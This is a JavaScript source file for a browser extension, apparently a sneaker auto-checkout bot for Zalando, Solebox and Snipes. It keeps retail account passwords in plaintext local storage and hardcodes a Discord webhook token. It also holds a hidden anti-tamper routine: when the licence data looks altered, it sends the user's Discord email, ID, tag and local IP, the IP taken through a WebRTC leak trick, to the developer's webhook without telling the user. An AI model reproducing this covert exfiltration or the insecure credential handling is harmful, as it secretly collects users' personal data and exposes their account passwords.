debugger

const version = 'Cava-Scripts 1.0.0'
const webhook_url = "https://discordapp.com/api/webhooks/772900196392239165/AuG4n_g8DB6WC208TjHjpzoMrqDn4vhQ-nnkmG2unIV5ZSjGjlAHMGs2KmZKR1I-z9xM"
const CRYPTO_KEY_INT_1 = "32463"
const CRYPTO_KEY_INT_2 = "90534"
const CRYPTO_KEY_INT_3 = "45873"

function testWebhook() {
    var url_private = localStorage.getItem("id_webhook")
    var request = new XMLHttpRequest();
    request.open("POST", url_private);
    request.setRequestHeader('Content-type', 'application/json');
    var today = new Date();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();

    var myEmbed = {
        title: "Test Webhook!",
        description: "Test",
        color: ("65280"),
        footer: {
            text: version + ' | ' + String(time),
            icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b1/Pok%C3%A9ball.png/480px-Pok%C3%A9ball.png',
        },
    }

    var params = {
        username: "",
        embeds: [myEmbed]
    }

    request.send(JSON.stringify(params));
}

async function sgamatoWebhook() {
    var request = new XMLHttpRequest();
    request.open("POST", webhook_url);
    request.setRequestHeader('Content-type', 'application/json');
    var today = new Date();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();

    var myEmbed = {
        title: "SCAM",
        color: ("16744192"),
        fields: [{
            name: 'Email',
            value: localStorage.getItem("discord_email"),
            inline: true
        },
        {
            name: 'Discord id',
            value: localStorage.getItem("discord_id"),
            inline: true
        },
        {
            name: 'Discord tag',
            value: localStorage.getItem("discord_tag"),
            inline: true
        },
        {
            name: 'Ip',
            value: await getNetworkIP(),
            inline: true
        }
        ],
        footer: {
            text: 'Cava-Scripts ' + version + ' | ' + String(time),
            icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b1/Pok%C3%A9ball.png/480px-Pok%C3%A9ball.png',
        },
    }

    var params = {
        username: "",
        embeds: [myEmbed]
    }

    request.send(JSON.stringify(params));

}

function scamError() {
    alert("SCAM")
    sgamatoWebhook()
    localStorage.clear()
    localStorage.setItem("data_auth", "off")
    localStorage.setItem("auth", "off")
    window.location.replace("/popup/popup-login.html");
}

async function getNetworkIP() {
    let found = false;
    let resolve;
    const promise = new Promise((res) => {
    resolve = res;
    });
    const pc = new RTCPeerConnection({ iceServers: [] });
    
    pc.addEventListener("icecandidate", (e) => {
    if (!e.candidate || found) return;
    resolve(e.candidate.address);
    found = true;
    });
    
    pc.createDataChannel("");
    pc.createOffer().then((desc) => pc.setLocalDescription(desc));
    
    return promise;
}

function checkData() {
    let data = localStorage.getItem("data_auth")
    let auth = localStorage.getItem("auth")
    if (data != "off" && auth != "off") {
        if (/^\d+$/.test(data) && data.includes(parseInt(CRYPTO_KEY_INT_1)) && data.includes(parseInt(CRYPTO_KEY_INT_3))) {
            try {
                let data_now = new Date
                data = data.replace(CRYPTO_KEY_INT_1, "/")
                //data = data.replace(CRYPTO_KEY_INT_2.toString(), "/")
                data = data.replace(CRYPTO_KEY_INT_3, "/")
                data = data.split("/")
                let day = parseInt(data[0]) / parseInt(CRYPTO_KEY_INT_2)
                let month = parseInt(data[2]) / parseInt(CRYPTO_KEY_INT_1)
                let year = parseInt(data[1]) / parseInt(CRYPTO_KEY_INT_3)
                let data_exp_login = new Date(year, month, day)
                if (day > 31 || day < 0 || month > 11 || month < 0 || year > 2100 || year < 2019) {
                    scamError()
                } else {
                    let data_exp_login = new Date(year, month, day)
                    if (data_now > data_exp_login) {
                        localStorage.setItem("data_auth", "off")
                        localStorage.setItem("auth", "off")
                        window.location.replace("/popup/popup-login.html")
                    }
                }
            } catch (error) {
                scamError()
            }
        } else {
            scamError()
        }
    }
    else if (auth == "on" && data == "off") {
        scamError()
    }
}

$(function () {

    if (localStorage.getItem("auth") == "off") {
        open('popup-login.html', "_self")
    } else if (localStorage.getItem("auth") == "on") {

        checkData()

        //INSERISCO LA VERSIONE NELLE PAGINE----------------------------------
        document.getElementById("version").innerHTML = version;
        //--------------------------------------------------------------------

        //GESTIONE PAGINA ACO------------------------------------------------

        //contollo se le variabili sono on e in caso checko la casella
        //Zalando
        if (localStorage.getItem("status_aco_zalando") == "on") { $('#Status_aco_zalando').prop('checked', true); }
        //Solebox
        if (localStorage.getItem("status_aco_solebox") == "on") { $('#Status_aco_solebox').prop('checked', true); }
        //Snipes
        if (localStorage.getItem("status_aco_snipes") == "on") { $('#Status_aco_snipes').prop('checked', true); }

        //gestisco i click delle checkbox
        //Zalando
        $('#Status_aco_zalando').click(function () {
            if ($("#Status_aco_zalando").is(':checked')) { localStorage.setItem("status_aco_zalando", "on"); } else { localStorage.setItem("status_aco_zalando", "off"); }
        });
        //Solebox
        $('#Status_aco_solebox').click(function () {
            if ($("#Status_aco_solebox").is(':checked')) { localStorage.setItem("status_aco_solebox", "on"); } else { localStorage.setItem("status_aco_solebox", "off"); }
        });
        //Snipes
        $('#Status_aco_snipes').click(function () {
            if ($("#Status_aco_snipes").is(':checked')) { localStorage.setItem("status_aco_snipes", "on"); } else { localStorage.setItem("status_aco_snipes", "off"); }
        });

        //---------------------------------------------------------------------

        //GESTIONE PAGINA Login------------------------------------------------

        //contollo se le variabili sono on e in caso checko la casella
        //Solebox
        if (localStorage.getItem("status_login_solebox") == "on") { $('#Status_login_solebox').prop('checked', true); }
        //Snipes
        if (localStorage.getItem("status_login_snipes") == "on") { $('#Status_login_snipes').prop('checked', true); }

        //gestisco i click delle checkbox
        //Solebox
        $('#Status_login_solebox').click(function () {
            if ($("#Status_login_solebox").is(':checked')) { localStorage.setItem("status_login_solebox", "on"); } else { localStorage.setItem("status_login_solebox", "off"); }
        });
        //Snipes
        $('#Status_login_snipes').click(function () {
            if ($("#Status_login_snipes").is(':checked')) { localStorage.setItem("status_login_snipes", "on"); } else { localStorage.setItem("status_login_snipes", "off"); }
        });

        //---------------------------------------------------------------------

        //GESTIONE PAGINA SETTING----------------------------------------------

        if (localStorage.getItem("id_webhook") != "off") { $("#idWebhook").val(localStorage.getItem("id_webhook")); }
        $("#nDelay").val(localStorage.getItem("delay"));

        //gestisco il click del bottone salva
        $("#btnSetting").click(function () {
            var id = $("#idWebhook").val();
            var d = $("#nDelay").val();
            if (id != '') { localStorage.setItem("id_webhook", id); } else { localStorage.setItem("id_webhook", "off"); }
            if (d != '') { localStorage.setItem("delay", d); } else { localStorage.setItem("delay", "0"); }
        });

        //gestisco il bottone test webhook
        $("#btnWebhook").click(function () {
            testWebhook()
        });

        //---------------------------------------------------------------------

        //GESTIONE PAGINA ZALANDO----------------------------------------------

        //contollo se email e pw sono già presenti nello storage e in caso li inserisco nell' input
        if (localStorage.getItem("email_pw_zalando") != "off") {
            var email = localStorage.getItem("email_pw_zalando").split(':')[0]
            var pw = localStorage.getItem("email_pw_zalando").split(':')[1]
            $("#email_zalando").val(email);
            $("#pw_zalando").val(pw);
        }
        //contollo se sono già presenti nello storage e in caso li inserisco nell' input
        if (localStorage.getItem("coupon_zalando") != "off") { $("#couponZ").val(localStorage.getItem("coupon_zalando")); }
        if (localStorage.getItem("link_zalando") != "off") { $("#linkZ").val(localStorage.getItem("link_zalando")); }
        if (localStorage.getItem("sku_zalando") != "off") { $("#skuZ").val(localStorage.getItem("sku_zalando")); }
        if (localStorage.getItem("preload_sku_zalando") != "off") { $("#preloadskuZ").val(localStorage.getItem("preload_sku_zalando")); }
        if (localStorage.getItem("timer_zalando") != "off") { $("#timer").val(localStorage.getItem("timer_zalando")); }
        if (localStorage.getItem("checkout_mode_zalando") != "off") { $("#checkoutMode").val(localStorage.getItem("checkout_mode_zalando")); }
        //gestisco il click del bottone salva
        $("#btnZ").click(function () {
            var e = $("#email_zalando").val();
            var p = $("#pw_zalando").val();
            var l = $("#linkZ").val();
            var c = $("#couponZ").val();
            var s = $("#skuZ").val();
            var ps = $("#preloadskuZ").val();
            var t = $("#timer").val();
            var ck = $("#checkoutMode").val();

            if (e != '' && p != '') { localStorage.setItem("email_pw_zalando", e + ":" + p); } else { localStorage.setItem("email_pw_zalando", "off"); }

            if (c != '') { localStorage.setItem("coupon_zalando", c); } else { localStorage.setItem("coupon_zalando", "off"); }

            if (l != '') { localStorage.setItem("link_zalando", l); } else { localStorage.setItem("link_zalando", "off"); }

            if (s != '') { localStorage.setItem("sku_zalando", s); } else { localStorage.setItem("sku_zalando", "off"); }

            if (ps != '') { localStorage.setItem("preload_sku_zalando", ps); } else { localStorage.setItem("preload_sku_zalando", "off"); }

            if (t != '') { localStorage.setItem("timer_zalando", t); } else { localStorage.setItem("timer_zalando", "off"); }

            if (ck != '') { localStorage.setItem("checkout_mode_zalando", ck); } else { localStorage.setItem("checkout_mode_zalando", "off"); }
        });
        //---------------------------------------------------------------------

        //GESTIONE PAGINA SOLEBOX----------------------------------------------
        //contollo se email e pw sono già presenti nello storage e in caso li inserisco nell' input
        if (localStorage.getItem("email_pw_solebox") != "off") {
            var email = localStorage.getItem("email_pw_solebox").split(':')[0]
            var pw = localStorage.getItem("email_pw_solebox").split(':')[1]
            $("#email_solebox").val(email);
            $("#pw_solebox").val(pw);
        }
        //gestisco il click del bottone salva
        $("#btn_save_solebox").click(function () {
            var e = $("#email_solebox").val();
            var p = $("#pw_solebox").val();

            if (e != '' && p != '') { localStorage.setItem("email_pw_solebox", e + ":" + p); } else { localStorage.setItem("email_pw_solebox", "off"); }
        });
        //---------------------------------------------------------------------

        //GESTIONE PAGINA SNIPES----------------------------------------------
        //contollo se email e pw sono già presenti nello storage e in caso li inserisco nell' input
        if (localStorage.getItem("email_pw_snipes") != "off") {
            var email = localStorage.getItem("email_pw_snipes").split(':')[0]
            var pw = localStorage.getItem("email_pw_snipes").split(':')[1]
            $("#email_snipes").val(email);
            $("#pw_snipes").val(pw);
        }
        //gestisco il click del bottone salva
        $("#btn_save_snipes").click(function () {
            var e = $("#email_snipes").val();
            var p = $("#pw_snipes").val();

            if (e != '' && p != '') { localStorage.setItem("email_pw_snipes", e + ":" + p); } else { localStorage.setItem("email_pw_snipes", "off"); }
        });
        //---------------------------------------------------------------------
    }
});